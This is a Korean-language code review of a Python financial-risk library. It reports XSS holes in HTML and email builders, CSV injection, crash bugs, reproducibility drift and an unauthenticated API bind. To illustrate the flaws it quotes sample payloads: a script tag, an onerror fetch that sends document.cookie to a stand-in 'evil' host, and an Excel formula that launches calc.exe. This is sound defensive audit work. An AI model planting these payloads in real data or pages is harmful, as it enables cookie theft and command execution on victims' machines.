# 10. 리포팅·파이프라인·데이터·툴 코드 리뷰

**리뷰 범위:** `risk_lib/report*.py`, `risk_lib/html*.py`, `risk_lib/printable.py`, `risk_lib/board_pack.py`, `risk_lib/work_report.py`, `risk_lib/mda.py`, `risk_lib/api.py`, `risk_lib/cli.py`, `risk_lib/pipeline.py`, `risk_lib/data_gen*.py`, `risk_lib/data_quality.py`, `risk_lib/timeseries*.py`, `risk_lib/notifications.py`, `risk_lib/integrations.py`, `risk_lib/deliverables.py`, `risk_lib/ops_pages/`, `risk_lib/ui_studio/`, `risk_lib/performance/`, `risk_lib/datamodel/`, `risk_lib/case_studies/`, `risk_lib/page_registry.py`, `risk_lib/references.py`, `risk_lib/abbreviations.py`, `risk_lib/comparison.py`, `risk_lib/rynta.py`, `risk_lib/product_master.py`, `risk_lib/commercial.py`, `tools/`, `validation-team-agent/tools/`, `validation-team-agent/src/`, `examples/`.

## HIGH — HTML/XSS 취약점

### 1. `risk_lib/report_chrome.py:159` — `_table()` `<` 포함 문자열 escape 스킵
```python
cells.append(f"<td{cls}>{v if isinstance(v, str) and ('<' in v) else _esc(v)}</td>")
```
- 이 헬퍼가 executive, printable, board_pack, 전 ops_pages, localization, timeseries_ledger에서 임포트됨.
- 실패 시나리오: 외부 피드 유래 obligor 명 `Acme<script>alert(1)</script>`이나 sector 라벨 `<img onerror=…>`가 board-pack·exec·printable·모든 ops 페이지에 그대로 삽입.

### 2. `risk_lib/notifications.py:160–167` — 이메일 페이로드 미escape
- `build_email_payload`가 `a.severity`, `a.category`, `a.title`, `a.detail`, `a.citation`을 raw f-string으로 이메일 HTML에 삽입.
- 실패 시나리오: 검증 체크 이름 `MTM breach <img src=x onerror=fetch('//evil/'+document.cookie)>`(체크 이름은 데이터 유래 문자열 포맷)이 outbound 알림 이메일에 raw. `_email.html`로 디스크 저장 + 웹훅 릴레이 → stored/relayed XSS.

### 3. `risk_lib/board_pack.py:128–134` — `_page_exec_summary` unescape
- `g`, `nm`, `cat`, `a`, `b`, `cit`를 `<b>[{g}] {nm}</b> ({cat}) — …<br/><span class="cite">{cit …}</span>`로 삽입. `nm`, `cat`, `cit`는 `k.name/category/citation`, `c.name/detail`에서 옴. `<`가 12페이지 dossier에 raw. 파일 내 다른 곳은 모두 `_esc()` 사용, 이 카드만 예외.

### 4. `risk_lib/work_report.py:198, 214, 216` — 마크다운→HTML naive 변환
- `render_html`의 `"".join(f"<{tag}>{c}</{tag}>" for c in cells)`, `f"<p>• {line[2:]}</p>"`가 셀·불릿·문단 raw 삽입. `rynta.coverage_frame()`, `ROUNDS`(json에서 로드)의 `<`가 페이지 파괴/실행.

## MEDIUM

### 5. `risk_lib/integrations.py:290–314` — `IsolatingDispatcher.send_with_isolation` 실행 즉시 crash
- `WebhookRequest`(34–39)에 `kind` 필드 없는데 `req.kind` 접근 → AttributeError.
- `hashlib.sha256(req.body)`가 `req.body: str`(bytes 아님) → TypeError.
- retry가 `self.send(req)`인데 `send(payload: dict)`가 `json.dumps(payload)` 호출 → dataclass 폭발.
- `self.policy.delays()` 계산만 하고 `sleep`/`await` 없음 → 연속 재시도.

### 6. `risk_lib/timeseries.py:62–63` — `synth_history`가 `pd.Timestamp.now()` 사용
- 파일 자체 재현성 주장(4–10)과 `pipeline.py:1500–1503`의 `asof_source="wall_clock"` 계약 위반. 같은 시드로 다른 날 실행 시 month_labels 상이 → exec/printable spark-line 침묵 드리프트.

### 7. `risk_lib/deliverables.py:38–46` — CSV injection 무방비
- `export_tables`가 셀 sanitisation 없이 `to_csv`. `=`, `+`, `-`, `@`로 시작하는 문자열이 Excel formula로 실행. Docstring이 Excel 대상임을 명시("UTF-8 BOM"). `note="=cmd|'/c calc.exe'!A1"`가 더블클릭에 live.

### 8. `risk_lib/data_quality.py:69–88` + `pipeline.py:328` — 계약 위반이 문자열 플래그만
- DQ 위반(중복 `exposure_id`, 음수 EAD, PD [0,1] 벗어남, >50% 결측)이 예외 없이 문자열 태그로만 표시. 하류 단계가 나쁜 프레임 소비. `_fill_sa_parameters`가 bare `assert`로 방어(있음) → `python -O`에서 no-op → NaN PD가 RWA로 침묵 전파.

## LOW
- `risk_lib/api.py:285–289` — `serve()`가 `--host` 그대로 바인딩, 인증 없음. `--host 0.0.0.0` 한 플래그 차이. 헤드라인 수치·digest·manifest가 평문 서빙. bind-guard 필요.
- `risk_lib/cli.py:31–32, 70–71` — `pd.read_csv(args.data)`가 크기/스키마/dtype 검증 없이 사용자 경로 수용. 20GB CSV나 `/dev/urandom` 심볼릭 링크에 hang.
- CLAUDE.md §5 위반 — 전 파일 광역. `pipeline.py` 67, `cli.py` 21, `api.py` 3, `mda.py` 3, 그리고 수백 건. 저장소 광역 스윕 필요.

## 클린 (부정적 검사 통과)
`printable.py`, `html_report.py`(오케스트레이터), `mda.py`, `close_workflow.py`, `timeseries_ledger.py`, `page_registry.py`, `comparison.py`, `cli_docs.py`, `data_gen.py`, `data_gen_intl.py`(데이터 코드), `tools/gen_fss_master.py`, `tools/gen_flow_html.py`(중앙 `E()` 사용), `tools/gen_erd.py`, `tools/gen_pipeline_flow.py`, `validation-team-agent/tools/report_template.py`(escape 정상), `validation-team-agent/tools/report_pdf.py`, `validation-team-agent/tools/validation_finding.py`.

`os.system`, `shell=True`, `eval`, `exec`, `pickle`, unsafe `yaml.load` 없음. 모든 `subprocess` 호출은 list-form 인자.
